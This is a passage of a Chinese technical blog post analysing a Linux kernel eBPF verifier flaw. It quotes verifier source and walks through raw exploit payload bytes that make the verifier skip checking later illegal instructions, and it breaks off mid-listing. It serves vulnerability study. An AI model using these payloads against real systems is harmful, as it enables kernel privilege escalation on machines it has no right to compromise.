<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">     * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将<code>imm</code>，也即<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>中的<code>0xffffffff</code>保存进虚拟执行的寄存器中，记录此mov指令的结果</p>
<p>不急着往下走，先来看看<code>regs[insn-&gt;dst_reg].imm</code>以及<code>insn-&gt;imm</code>的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">        <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;        <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;    <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;    <span class="comment">/* source register */</span></span><br><span class="line">    __s16    off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32    imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到这两个值的数据类型是一致的，都是32位有符号整数</p>
<p>到这儿没有什么问题，<code>check_alu_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令</p>
<p>来看第二行指令 <code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p>
<p>还是老样子，先计算class: <code>0x55 &amp; 0x07 = 0x05</code></p>
<p>此为<code>JMP</code>类型的指令，进入<code>else if (class == BPF_JMP)</code>分支，计算opcode：<code>0x55 &amp; 0xf0 = 0x50</code></p>
<p>根据opcode，执行<code>check_cond_jmp_op</code>函数</p>
<p>函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(struct verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">                 struct bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> env-&gt;cur_state.regs;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">other_branch</span>;</span></span><br><span class="line">    u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opcode &gt; BPF_EXIT) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;invalid BPF_JMP opcode %x\n&quot;</span>, opcode);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">        <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src1 operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer comparison prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_JMP uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check src2 operand */</span></span><br><span class="line">    err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 主要关注这里</span></span><br><span class="line">    <span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">        (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            *insn_idx += insn-&gt;off;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">             * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (!other_branch)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">        insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ ||</span><br><span class="line">                   opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* next fallthrough insn can access memory via</span></span><br><span class="line"><span class="comment">             * this register</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">            <span class="comment">/* branch targer cannot access it, since reg == 0 */</span></span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;R%d pointer comparison prohibited\n&quot;</span>, insn-&gt;dst_reg);</span><br><span class="line">        <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">           (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* detect if (R == imm) goto</span></span><br><span class="line"><span class="comment">             * and in the target state recognize that R = imm</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* detect if (R != imm) goto</span></span><br><span class="line"><span class="comment">             * and in the fall-through state recognize that R = imm</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (log_level)</span><br><span class="line">        print_verifier_state(env);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>check_cond_jmp_op</code>函数中，主要关注如下的代码片段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line"><span class="keyword">if</span> (!other_branch)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure>
<p>在这个代码片段中，检查了当前的跳转是否是确定的，也即“恒跳转”，如果是确定的，那么要么<code>insn_idx</code>前移(JEQ)，要么不动(JNE)，而如果不是确定的跳转，那么就说明之后的分支是有可能会被执行的，那么调用<code>push_stack</code>函数将下一个可能的分支压栈，等待进一步的校验</p>
<p>我们来分别看看第二句payload是否符合这个条件</p>
<ol>
<li><code>BPF_SRC(insn-&gt;code) == BPF_K</code>这一句：<code>0x55 &amp; 0x08 = 0x00 == BPF_K</code>, 符合条件</li>
<li><code>(opcode == BPF_JEQ || opcode == BPF_JNE)</code>这一句，<code>opcode = 0x50 == BPF_JNE</code>，符合条件</li>
<li><code>regs[insn-&gt;dst_reg].type == CONST_IMM</code>这一句，如果还记得，第一句payload中，<code>regs[insn-&gt;dst_reg].type</code>就被赋值为了<code>CONST_IMM</code>，符合条件</li>
<li><code>regs[insn-&gt;dst_reg].imm == insn-&gt;imm</code>这一句，由于等号两边数据类型都是有符号32位整型(很关键)，并且<code>0xffffffff == 0xffffffff</code>，所以符合条件</li>
</ol>
<p>既然四个都为<code>true</code>，并且<code>opcode = 0x50 == BPF_JNE</code>，那么直接返回，不执行之后的压入下一个可能分支的操作</p>
<p>到这儿同样也是没有什么问题，<code>check_cond_jmp_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令，由于没有跳转，所以依然是顺序执行</p>
<p>那我们继续来看第三句指令 <code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>，这一句没有什么特别的，和第一句payload很像，仅是为了保证下方第四句payload能够正常执行,原因如下代码所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于第四句payload的opcode为<code>BPF_EXIT</code>，所以要想保证第四句指令的执行不出错，那么就要保证<code>BPF_REG_0</code>中的值为0</p>
<p>故而第三句指令<code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>即是将<code>BPF_REG_0</code>赋值为0</p>
<p>第三句指令执行完成后，我们继续看第四句指令<code>\x95\x00\x00\x00\x00\x00\x00\x00</code>，这一句就类似<code>exit(0)</code></p>
<p>这句指令在计算了class以及opcode后，会进入以下分支：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">                 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">                 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">                 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">                 * something into it earlier</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123; <span class="comment">// 保证不泄露内核地址</span></span><br><span class="line">                    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    do_print_state = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br></pre></td></tr></table></figure>
<p>这里在经过安全检查后，尝试调用<code>pop_stack</code>函数，检查是否还有可能执行的分支等待检查，如果没有，那么直接跳出循环，结束检查，加载bpf指令</p>
<p>在我们的payload中，没有等待检查的分支，符合这一情况。那么换句话说，<code>do_check</code>函数只检查了前四句payload就认为之后的语句不会再被执行了，于是就放弃了对后续大段非法payload的校验</p>
<p>实际上，如果真实执行的流程与虚拟执行的流程完全一样，那么实际上是不存在漏洞的，我们的payload至始至终也只会执行前四句指令而已，但是，问题就出在了这两种流程的差别之处</p>
<p>那么我们看看真实执行的情况，以下代码均位于<code>kernel/bpf/core.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span 